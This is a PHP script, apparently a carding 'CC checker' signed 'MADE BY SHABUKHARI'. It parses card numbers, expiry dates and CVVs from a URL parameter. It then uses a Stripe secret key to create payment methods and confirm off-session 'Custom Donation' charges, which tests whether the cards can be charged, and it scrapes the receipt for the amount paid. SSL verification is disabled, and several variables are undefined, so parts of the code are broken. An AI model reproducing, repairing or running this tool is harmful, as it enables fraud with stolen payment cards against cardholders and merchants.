<?php


error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;
}

///YOU CAN ALSO ADD SK USING INDEX 
$lista = $_GET['lista'];
preg_match_all('/[0-9]{15,16}/', $lista, $cc);
    preg_match_all('/[0-9]{1,4}/', $lista, $year);
    
    
$year20 = $year[0][5];
    
if(strlen($year20) == 2){
        
    $year20 = "20$year20";
}
$lista = ''.$cc[0][0].'|'.$year[0][4].'|'.$year20.'|'.$year[0][6].'';
 $cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
 $mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
 $cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
 
function GetStr($string, $start, $end)
{
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
}


$ch = curl_init();
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/balance');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Authorization: Basic '.$bear.'';
$headers[] = 'sec-ch-ua: "Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$curl = curl_exec($ch);
curl_close($ch);

//echo htmlentities($curl,ENT_QUOTES).'<hr>';

$cur = trim(strip_tags(getStr($curl, '"currency": "','",')));
//echo 'cur:'.$cur.'<hr>';


######### req 1 ###############

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'');
$result1 = curl_exec($ch);
$tok1 = Getstr($result1,'"id": "','"');

$msg = Getstr($result1,'"message": "','"');
//echo 'msg:'.$msg.'<hr>';


//echo htmlentities($result1,ENT_QUOTES).'<hr>';


#-------------------[2nd REQ]--------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$amo.'&currency='.$cur.'&payment_method_types[]=card&description=Custom Donation&payment_method='.$tok1.'&confirm=true&off_session=true');
$result2 = curl_exec($ch);
$tok2 = Getstr($result2,'"id": "','"');
$receipturl = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));

$msg2 = trim(strip_tags(getStr($result2,'"message": "','"')));

//echo 'msg2:'.$msg2.'<hr>';

//echo htmlentities($result2,ENT_QUOTES).'<hr>';


$path = trim(strip_tags(getStr($receipturl,'https://pay.stripe.com','CUSTOM')));


######## CHARGE AMOUNT #############

$ch = curl_init();
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_URL, $receipturl1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'authority: pay.stripe.com';
$headers[] = 'method: GET';
$headers[] = 'path: '.$path.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$charge = curl_exec($ch);
curl_close($ch);

//echo htmlentities($charge,ENT_QUOTES).'<hr>';

$chargeamo = trim(strip_tags(getStr($charge,'Amount paid','Date')));

//echo 'chargeamo:'.$chargeamo.'<hr>';

echo "MADE BY SHABUKHARI";


?>
